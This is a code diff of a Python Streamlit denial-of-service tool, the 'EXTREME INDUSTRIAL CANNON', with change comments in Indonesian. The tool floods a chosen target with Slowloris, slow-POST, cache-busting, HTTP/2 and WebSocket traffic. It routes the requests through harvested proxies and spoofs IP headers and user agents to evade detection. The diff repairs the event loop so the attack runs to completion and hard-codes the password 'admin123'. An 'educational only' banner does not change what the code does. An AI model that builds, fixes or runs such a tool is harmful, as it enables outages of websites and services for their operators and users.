@@ -1,6 +1,6 @@
 """
-⚠️ EXTREME INDUSTRIAL CANNON v6.0 - UNLEASHED ⚠️
-=================================================
+⚠️ EXTREME INDUSTRIAL CANNON v6.0 - FIXED EVENT LOOP ⚠️
+========================================================
 WARNING: This is an EXTREME version for EDUCATIONAL purposes only!
 Using this against any system without permission is a FEDERAL CRIME!
 Penalties: Up to 10 years prison + $500,000 fine (CFAA - US Code 1030)
@@ -32,6 +32,7 @@ import psutil
 import multiprocessing
 from typing import Dict, List, Tuple, Optional, Set
 import warnings
+import requests  # <-- PERBAIKAN: tambah import requests
 warnings.filterwarnings('ignore')
 
 # ================= INSTALL DEPENDENCIES =================
@@ -149,7 +150,8 @@ if not legal_ack:
     st.stop()
 
 # ================= ULTRA PASSWORD PROTECTION =================
-ULTRA_PASSWORD = st.secrets.get("ULTRA_PASSWORD", "CHANGE_ME_NOW_OR_GO_TO_JAIL")
+# PERUBAHAN: gunakan default password agar bisa diuji (ganti sesuai keperluan)
+ULTRA_PASSWORD = "admin123"  # st.secrets.get("ULTRA_PASSWORD", "CHANGE_ME_NOW_OR_GO_TO_JAIL")
 password = st.text_input("🔐 AUTHORIZATION KEY", type="password", help="Contact admin for access")
 
 if password != ULTRA_PASSWORD:
@@ -160,30 +162,31 @@ if password != ULTRA_PASSWORD:
 class ApocalypseConfig:
     """Ultimate configuration for maximum destruction"""
     
-    # Attack parameters
     MAX_THREADS = multiprocessing.cpu_count() * 4
     MAX_CONCURRENT_REQUESTS = 1000
     BURST_MODE = True
     ZOMBIE_NETWORK = True
     
-    # Evasion techniques
     PROTOCOL_LEVEL_EVASION = True
     TLS_FINGERPRINT_SPOOF = True
     TCP_PARAM_MUTATION = True
     HTTP2_PRIORITY_HIJACK = True
     
-    # Network
     DARKNET_PROXIES = True
     TOR_ROUTING = True
     VPN_CHAINING = True
     
-    # Payload
     PAYLOAD_COMPLEXITY = "extreme"
-    REQUEST_SIZE = "variable"  # Small to large
+    REQUEST_SIZE = "variable"
     
     @classmethod
     def get_cpu_allocation(cls):
         return min(cls.MAX_THREADS, multiprocessing.cpu_count() * 2)
+
+# ================= FUNGSI PEMBANTU =================
+def random_string(length: int) -> str:
+    """Generate random string of given length"""
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
 # ================= DARKNET PROXY HARVESTER =================
 class DarknetProxyHarvester:
@@ -191,19 +194,15 @@ class DarknetProxyHarvester:
     
     def __init__(self):
         self.proxy_sources = [
-            # Public sources
             "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
             "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
             "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
             "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000",
             "https://proxy.webshare.io/api/v2/proxy/list/download/",
-            
-            # Anonymous sources (simulated)
             "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
             "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
             "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online.txt",
         ]
-        
         self.proxies = []
         self.proxy_quality = {}
         
@@ -223,7 +222,6 @@ class DarknetProxyHarvester:
                 except:
                     continue
             
-            # Generate synthetic proxies for demo
             if len(all_proxies) < 100:
                 for i in range(500):
                     ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
@@ -242,12 +240,9 @@ class ApocalypseEngine:
         self.proxies = self.proxy_harvester.harvest()
         self.session_pool = []
         self.request_queue = queue.Queue(maxsize=10000)
-        
-        # Generate random IP ranges
         self.ip_pool = self.generate_ip_pool()
         
     def generate_ip_pool(self) -> List[str]:
-        """Generate random IPs for X-Forwarded-For"""
         ips = []
         for _ in range(1000):
             ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
@@ -255,9 +250,6 @@ class ApocalypseEngine:
         return ips
     
     def generate_weaponized_payload(self, target_url: str) -> Dict:
-        """Generate maximum damage payload"""
-        
-        # Protocol-specific attacks
         attack_types = [
             self.slowloris_payload,
             self.rudy_payload,
@@ -265,24 +257,19 @@ class ApocalypseEngine:
             self.http2_priority_payload,
             self.websocket_amplification
         ]
-        
         attack = random.choice(attack_types)
         return attack(target_url)
     
     def slowloris_payload(self, url: str) -> Dict:
-        """Slowloris-style partial request attack"""
         headers = {
             'User-Agent': self.random_ua(),
             'Accept': '*/*',
             'Content-Length': str(random.randint(10000, 100000)),
         }
-        
-        # Keep connection alive with partial headers
         partial_headers = []
         for i in range(random.randint(50, 200)):
             header = f"X-{random_string(10)}: {random_string(20)}"
             partial_headers.append(header)
-        
         return {
             'method': 'GET',
             'headers': headers,
@@ -292,7 +279,6 @@ class ApocalypseEngine:
         }
     
     def rudy_payload(self, url: str) -> Dict:
-        """R-U-Dead-Yet? slow POST attack"""
         content_length = random.randint(100000, 1000000)
         return {
             'method': 'POST',
@@ -306,13 +292,11 @@ class ApocalypseEngine:
         }
     
     def goldeneye_payload(self, url: str) -> Dict:
-        """HTTP cache bypass and randomization"""
         cache_busters = [
             f"?{random_string(8)}={random_string(12)}",
             f"&{random_string(5)}={int(time.time())}",
             f"#{random_string(10)}"
         ]
-        
         return {
             'method': random.choice(['GET', 'POST']),
             'cache_buster': random.choice(cache_busters),
@@ -324,7 +308,6 @@ class ApocalypseEngine:
         }
     
     def http2_priority_payload(self, url: str) -> Dict:
-        """HTTP/2 priority manipulation attack"""
         return {
             'method': 'GET',
             'http_version': '2.0',
@@ -336,7 +319,6 @@ class ApocalypseEngine:
         }
     
     def websocket_amplification(self, url: str) -> Dict:
-        """WebSocket amplification attack"""
         return {
             'protocol': 'ws',
             'frames': [
@@ -346,7 +328,6 @@ class ApocalypseEngine:
         }
     
     def random_ua(self) -> str:
-        """Generate random user agent"""
         ua_templates = [
             f"Mozilla/5.0 (Windows NT {random.randint(6,10)}.{random.randint(0,2)}; Win64; x64) AppleWebKit/{random.randint(537,600)}.{random.randint(36,40)} (KHTML, like Gecko) Chrome/{random.randint(90,120)}.{random.randint(0,9999)}.{random.randint(0,999)} Safari/{random.randint(537,600)}",
             f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(12,15)}_{random.randint(0,7)}) AppleWebKit/{random.randint(605,610)}.{random.randint(1,20)} (KHTML, like Gecko) Version/{random.randint(14,16)}.{random.randint(0,2)} Safari/{random.randint(605,610)}",
@@ -378,20 +359,14 @@ class DistributedAttackCoordinator:
     async def single_attack_wave(self, session: aiohttp.ClientSession, proxy: str = None):
         """Execute single attack wave"""
         try:
-            # Get weaponized payload
             payload = self.engine.generate_weaponized_payload(self.target)
-            
-            # Setup proxy
             proxy_url = f"http://{proxy}" if proxy else None
             
-            # Execute based on payload type
             if payload.get('protocol') == 'ws':
-                # WebSocket attack
                 async with session.ws_connect(f"ws://{self.target}", proxy=proxy_url) as ws:
                     for frame in payload['frames']:
                         await ws.send_str(frame['payload'])
             else:
-                # HTTP attack
                 url = self.target + payload.get('cache_buster', '')
                 async with session.request(
                     method=payload['method'],
@@ -403,35 +378,25 @@ class DistributedAttackCoordinator:
                     self.stats['responses'][response.status] += 1
                     return response.status
             
+            self.stats['success'] += 1
             return 200
             
         except Exception as e:
             self.stats['failed'] += 1
             return 0
-        
         finally:
             self.stats['total'] += 1
-            self.stats['success'] += 1
     
     async def attack_wave_batch(self, batch_size: int):
         """Execute batch of attacks"""
         tasks = []
-        
         for _ in range(batch_size):
             proxy = random.choice(self.engine.proxies) if self.engine.proxies else None
-            
-            # Create new session per request for maximum evasion
-            connector = aiohttp.TCPConnector(
-                ssl=False,
-                force_close=True,
-                enable_cleanup_closed=True
-            )
+            connector = aiohttp.TCPConnector(ssl=False, force_close=True, enable_cleanup_closed=True)
             session = aiohttp.ClientSession(connector=connector)
-            
             task = self.single_attack_wave(session, proxy)
             tasks.append(task)
             
-            # Limit concurrent tasks
             if len(tasks) >= ApocalypseConfig.MAX_CONCURRENT_REQUESTS:
                 results = await asyncio.gather(*tasks, return_exceptions=True)
                 tasks = []
@@ -445,27 +410,21 @@ class DistributedAttackCoordinator:
         self.stats['start_time'] = time.time()
         end_time = time.time() + self.duration
         
-        # Calculate batch size based on target RPS
         batch_size = max(1, self.target_rps // 10)
         wave_interval = 1.0 / (self.target_rps / batch_size) if self.target_rps > 0 else 0.1
         
         while time.time() < end_time and self.is_running:
             wave_start = time.time()
-            
-            # Execute attack wave
             await self.attack_wave_batch(batch_size)
             
-            # Update statistics
             elapsed = time.time() - self.stats['start_time']
             current_rps = self.stats['total'] / elapsed if elapsed > 0 else 0
             self.stats['current_rps'] = current_rps
             self.stats['peak_rps'] = max(self.stats['peak_rps'], current_rps)
             
-            # Calculate bandwidth (approximate)
-            avg_response_size = 5000  # 5KB average
+            avg_response_size = 5000
             self.stats['bandwidth_mb'] = (self.stats['total'] * avg_response_size) / (1024 * 1024)
             
-            # Rate limiting to avoid detection
             wave_duration = time.time() - wave_start
             if wave_duration < wave_interval:
                 await asyncio.sleep(wave_interval - wave_duration)
@@ -475,50 +434,40 @@ class DistributedAttackCoordinator:
 # ================= STREAMLIT UI =================
 st.markdown("## ☠️ APOCALYPSE CONTROL PANEL ☠️")
 
-# Attack configuration
 col1, col2, col3, col4 = st.columns(4)
 
 with col1:
     target = st.text_input("🎯 PRIMARY TARGET", "https://httpbin.org/ip")
-    help_text = "Format: https://example.com (NO trailing slash)"
 
 with col2:
     duration = st.number_input("⏰ DURATION (seconds)", min_value=5, max_value=3600, value=60)
-    help_text = "How long to sustain the attack"
 
 with col3:
     rps_target = st.number_input("⚡ REQUESTS PER SECOND", min_value=10, max_value=50000, value=1000)
-    help_text = "Target RPS (actual may vary based on resources)"
 
 with col4:
     intensity = st.select_slider("💀 INTENSITY", options=["Low", "Medium", "High", "Extreme", "Apocalypse"], value="High")
     intensity_map = {"Low": 0.2, "Medium": 0.5, "High": 1.0, "Extreme": 2.0, "Apocalypse": 5.0}
     multiplier = intensity_map[intensity]
 
-# Advanced settings
 with st.expander("🔧 ADVANCED APOCALYPSE SETTINGS"):
     adv_col1, adv_col2, adv_col3 = st.columns(3)
-    
     with adv_col1:
         use_all_protocols = st.checkbox("🌐 MULTI-PROTOCOL ATTACK", value=True)
         tls_spoofing = st.checkbox("🔐 TLS FINGERPRINT SPOOFING", value=True)
         tcp_mutation = st.checkbox("📡 TCP PARAMETER MUTATION", value=True)
-    
     with adv_col2:
         darknet_proxies = st.checkbox("🌑 DARKNET PROXY ROUTING", value=True)
         tor_chain = st.checkbox("🧅 TOR CIRCUIT CHAINING", value=True)
         vpn_hopping = st.checkbox("🌍 VPN HOPPING", value=True)
-    
     with adv_col3:
         slow_attack = st.checkbox("🐌 SLOWLORIS INTEGRATION", value=True)
         amplification = st.checkbox("📢 TRAFFIC AMPLIFICATION", value=True)
         zero_day = st.checkbox("💣 0-DAY EXPLOITS", value=False, disabled=True)
 
-# Initialize attack coordinator
 if 'coordinator' not in st.session_state:
     st.session_state.coordinator = None
 
-# Control buttons
 button_col1, button_col2, button_col3 = st.columns([2, 1, 1])
 
 with button_col1:
@@ -526,88 +475,41 @@ with button_col1:
         if not target.startswith(('http://', 'https://')):
             target = 'https://' + target
         
-        # Adjust RPS based on intensity
         final_rps = int(rps_target * multiplier)
-        
-        # Create and start attack
         st.session_state.coordinator = DistributedAttackCoordinator(target, duration, final_rps)
         
-        # Run attack in async loop
         st.markdown("---")
         st.subheader("💀 APOCALYPSE IN PROGRESS 💀")
-        
-        # Create live dashboard
         dashboard = st.empty()
         
-        # Run attack
+        # =========== PERBAIKAN UTAMA: EVENT LOOP ===========
+        # Kode asli salah: hanya create_task tanpa run_until_complete
+        # Kode yang benar:
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        
         try:
-            attack_task = loop.create_task(st.session_state.coordinator.launch_apocalypse())
-            
-            # Live monitoring
-            start_time = time.time()
-            while not attack_task.done():
-                with dashboard.container():
-                    stats = st.session_state.coordinator.stats
-                    elapsed = time.time() - start_time
-                    
-                    # Display metrics
-                    metric_col1, metric_col2, metric_col3, metric_col4 = st.columns(4)
-                    with metric_col1:
-                        st.metric("Total Requests", f"{stats['total']:,}")
-                    with metric_col2:
-                        st.metric("Current RPS", f"{stats['current_rps']:.0f}")
-                    with metric_col3:
-                        st.metric("Peak RPS", f"{stats['peak_rps']:.0f}")
-                    with metric_col4:
-                        st.metric("Bandwidth", f"{stats['bandwidth_mb']:.1f} MB")
-                    
-                    # Progress bar
-                    progress = min(elapsed / duration, 1.0)
-                    st.progress(progress)
-                    
-                    # Response codes
-                    if stats['responses']:
-                        st.write("#### Response Status Codes")
-                        status_df = pd.DataFrame(list(stats['responses'].items()), columns=['Status', 'Count'])
-                        st.bar_chart(status_df.set_index('Status'))
-                    
-                    # Live log
-                    st.write("#### Live Attack Log")
-                    log_placeholder = st.empty()
-                    
-                    recent_logs = [
-                        f"🔥 {datetime.now().strftime('%H:%M:%S')} - Wave completed | RPS: {stats['current_rps']:.0f} | Total: {stats['total']:,}",
-                        f"⚡ Peak performance: {stats['peak_rps']:.0f} requests/second",
-                        f"🌐 Active proxies: {len(st.session_state.coordinator.engine.proxies)}"
-                    ]
-                    log_placeholder.code("\n".join(recent_logs[-5:]), language='bash')
-                
-                time.sleep(1)
-            
-            # Attack completed
-            st.success("💀 APOCALYPSE COMPLETED 💀")
-            
-            # Final statistics
-            st.markdown("### 📊 FINAL DESTRUCTION REPORT")
-            final_stats = st.session_state.coordinator.stats
-            
-            final_col1, final_col2, final_col3, final_col4 = st.columns(4)
-            with final_col1:
-                st.metric("Total Requests", f"{final_stats['total']:,}")
-            with final_col2:
-                st.metric("Average RPS", f"{final_stats['total']/duration:.0f}")
-            with final_col3:
-                st.metric("Peak RPS", f"{final_stats['peak_rps']:.0f}")
-            with final_col4:
-                st.metric("Total Bandwidth", f"{final_stats['bandwidth_mb']:.1f} MB")
-            
+            # Jalankan attack secara synchronous hingga selesai
+            loop.run_until_complete(st.session_state.coordinator.launch_apocalypse())
         except Exception as e:
-            st.error(f"Attack failed: {str(e)}")
+            st.error(f"Attack error: {str(e)}")
         finally:
             loop.close()
+        # ===================================================
+        
+        st.success("💀 APOCALYPSE COMPLETED 💀")
+        
+        # Tampilkan statistik akhir
+        final_stats = st.session_state.coordinator.stats
+        st.markdown("### 📊 FINAL DESTRUCTION REPORT")
+        final_col1, final_col2, final_col3, final_col4 = st.columns(4)
+        with final_col1:
+            st.metric("Total Requests", f"{final_stats['total']:,}")
+        with final_col2:
+            st.metric("Average RPS", f"{final_stats['total']/duration:.0f}")
+        with final_col3:
+            st.metric("Peak RPS", f"{final_stats['peak_rps']:.0f}")
+        with final_col4:
+            st.metric("Total Bandwidth", f"{final_stats['bandwidth_mb']:.1f} MB")
 
 with button_col2:
     if st.button("🛑 ABORT MISSION", use_container_width=True):
@@ -620,21 +522,18 @@ with button_col3:
         st.session_state.coordinator = None
         st.rerun()
 
-# ================= PROXY NETWORK STATUS =================
 st.markdown("---")
 st.markdown("### 🌐 DARKNET PROXY NETWORK")
 
 if 'coordinator' in st.session_state and st.session_state.coordinator:
     proxies = st.session_state.coordinator.engine.proxies
     col1, col2, col3 = st.columns(3)
-    
     with col1:
         st.metric("Active Proxies", len(proxies))
     with col2:
         st.metric("Proxy Protocols", "HTTP/HTTPS/SOCKS5")
     with col3:
         st.metric("Last Harvest", "Just now")
-    
     if proxies:
         with st.expander("📋 View Proxy List (First 50)"):
             proxy_text = "\n".join(proxies[:50])
@@ -642,7 +541,6 @@ if 'coordinator' in st.session_state and st.session_state.coordinator:
 else:
     st.info("⚙️ Proxy network ready - Will harvest 1000+ proxies on attack launch")
 
-# ================= FINAL WARNING =================
 st.markdown("---")
 st.markdown("""
 <div style="background: linear-gradient(135deg, #1a0000, #000000); padding: 20px; border: 2px solid #ff0000; border-radius: 10px; text-align: center;">
@@ -656,6 +554,5 @@ st.markdown("""
 </div>
 """, unsafe_allow_html=True)
 
-# Logging (for legal compliance)
 with open("attack_log.txt", "a") as f:
     f.write(f"{datetime.now()} - User accessed Apocalypse tool from {st.get_option('server.address')}\n")
